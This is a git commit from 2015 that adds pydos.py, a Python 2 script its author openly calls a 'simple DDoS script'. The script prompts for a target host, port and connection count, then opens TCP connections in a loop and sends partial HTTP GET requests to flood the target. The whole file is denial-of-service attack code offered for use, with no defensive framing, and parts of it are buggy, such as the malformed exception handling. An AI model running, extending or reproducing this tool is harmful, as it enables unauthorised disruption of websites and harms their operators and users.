a7a0d10df7a7779aeb24136169f8367f266fd596
Hadesy2k <Hadesy2k@users.noreply.github.com>
2015-05-25 12:45:40 +0630

    pydos.py
    This Dos Script use Port 80 and HTTP request to engage the attack.

---
+++ pydos.py
@@ -0,0 +1,49 @@
+# Author : Hades.y2k
+# Date   : 25/05/2015
+# <OpenSource>
+
+import httplib, socket, os, sys, string, time
+
+print "THIS IS A SIMPLE DDOS SCRIPT BY PYTHON."
+
+class engage():
+    def __init__(self):
+        self.dos()
+
+    def dos(self):
+        target = raw_input("Enter the target host. ")
+        port = int(raw_input("Enter the port no. "))
+        conn = int(raw_input("Enter the numbers of connection you wanna make. "))
+        msg = "/* Hello World. */"
+
+        try:
+            webs = target.replace("http://", "")
+            connec = httplib.HTTPConnection(webs)
+            print "[+] Connecting the Website."
+            connec.connect()
+            print "[+] Connection Established, It's Online.\n"
+        except (httplib.HTTPResponse, socket.error) as Exit:
+            print "[!] Website cannot be connected.\n"
+            sys.exit()
+
+        print "[*] Engaged the DDoS Attack"
+        print "[*] DDoS Attack Start in " + time.ctime() + "\n"
+
+        def engaging():
+            print "[!] Engaging the Target."
+            ip = socket.gethostbyname(target)
+            ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                ddos.connect((target, 80))
+                ddos.send("GET /%s HTTP/1.1\r\n" % msg)
+                ddos.sendto("GET /%s HTTP/1.1\r\n" % msg, (ip, port))
+            except socket.error, KeyboardInterrupt:
+                print "[!] Failed to Attack the Target. [!]"
+            ddos.close()
+
+        for x in xrange(conn):
+            engaging()
+        print "\n[*] DDoS Attack End in " + time.ctime() + "\n"
+
+if __name__ == "__main__":
+    engage()
